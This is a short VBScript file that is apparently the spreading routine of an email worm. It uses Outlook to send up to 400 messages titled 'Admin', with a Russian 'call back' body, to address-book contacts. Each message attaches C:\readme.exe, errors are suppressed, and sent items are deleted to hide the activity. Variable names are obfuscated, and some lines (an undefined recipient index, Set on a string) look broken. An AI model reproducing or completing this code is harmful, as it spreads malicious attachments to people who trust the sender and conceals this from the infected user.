On Error Resume Next
Set gQarmmI=CreateObject("Outlook.Application")
For hgCQPXa=1 To 400
Set BvNRmXk=gQarmmI.CreateItem(0)
BvNRmXk.DeleteAfterSubmit = True
BvNRmXk.To = gQarmmI.GetNameSpace("MAPI").AddressLists(1).AddressEntries(X)
BvNRmXk.Body = "Перезвони!" & vbcrlf & ""
BvNRmXk.Subject = "Admin"
Set AOUvKdI = "C:\readme.exe"
BvNRmXk.Attachments.Add (AOUvKdI)
if BvNRmXk.To <> "" then BvNRmXk.Send
Next
gQarmmI.Quit
